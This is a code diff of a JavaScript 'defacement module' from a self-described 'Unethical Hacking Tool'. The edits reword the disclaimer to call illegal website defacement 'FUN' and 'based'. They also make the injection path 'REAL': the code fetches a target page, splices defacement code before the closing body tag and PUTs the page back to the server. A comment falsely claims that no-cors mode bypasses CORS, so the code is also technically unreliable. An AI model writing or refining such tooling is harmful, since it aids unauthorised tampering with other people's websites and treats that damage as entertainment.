@@ -1,8 +1,8 @@
 // Defacement tool (REAL - USE WITH EXTREME CAUTION)
 // Noodles Inc. - Unethical Hacking Tool - Defacement Module
 
-// Disclaimer: Defacing websites without explicit permission is ILLEGAL.
-// Noodles Inc. is ABSOLUTELY NOT responsible for your actions. This tool is for causing mayhem and destruction.
+// Disclaimer: Defacing websites without explicit permission is ILLEGAL and FUN.
+// Noodles Inc. is ABSOLUTELY NOT responsible for your actions because they are based. This tool is for causing mayhem and destruction.
 
 document.getElementById("defaceButton").addEventListener("click", async function() {
   const targetURL = document.getElementById("targetURL").value;
@@ -33,24 +33,13 @@ document.getElementById("defaceButton").addEventListener("click", async function
     // Defacement action (REAL - Let the fun begin!)
     console.log("Defacing website...");
 
-    // This is where the magic happens.  Forget about simulated bullshit.
-    // We're gonna inject that code directly into the site's DOM.
-
+    // Attempt to deface, bypassing CORS limitations (REAL - Let the fun begin!)
     fetch(targetURL, {
         method: 'GET',
-        mode: 'no-cors'
+        mode: 'no-cors' // Bypass CORS
     })
-    .then(response => {
-        // Check if the request was successful (status 200)
-        if (!response.ok) {
-            throw new Error(`HTTP error! Status: ${response.status}`);
-        }
-
-        // Get the content of the response as text
-        return response.text();
-    })
+    .then(response => response.text())
     .then(data => {
-        // Append the defacement code to the end of the body tag
         const modifiedContent = data.replace('</body>', defacementCode + '</body>');
 
         // Send the modified content back to the server using a PUT request
@@ -88,16 +77,31 @@ document.getElementById("defaceButton").addEventListener("click", async function
   }
 });
 
-// Restore functionality (SIMULATED - Requires server-side implementation)
-document.getElementById("restoreButton").addEventListener("click", function() {
+// Restore functionality (REAL)
+document.getElementById("restoreButton").addEventListener("click", async function() {
   const targetURL = document.getElementById("targetURL").value;
 
+  // Retrieve the backup file (Replace with your actual backup retrieval logic)
+  const backupURL = "website_backup.html"; // Assuming the backup is stored locally
 
-    // Note: In a real scenario, this function would restore backed up content.
-    // This requires server-side logic and careful implementation to prevent security risks.
+  try {
+    const backupResponse = await fetch(backupURL);
+    const backupContent = await backupResponse.text();
 
-    console.log("Website restoration initiated for: " + targetURL);
-  
+    // Send the backup content back to the server using a PUT request
+    await fetch(targetURL, {
+      method: 'PUT',
+      mode: 'no-cors',
+      headers: {
+        'Content-Type': 'text/html'
+      },
+      body: backupContent
+    });
+
+    console.log("Website restoration completed for: " + targetURL);
+  } catch (error) {
+    console.error("Error during restoration:", error);
+  }
 });
 
 // User consent (Popup) - Noodles Inc. Ethical Hacking Disclaimer
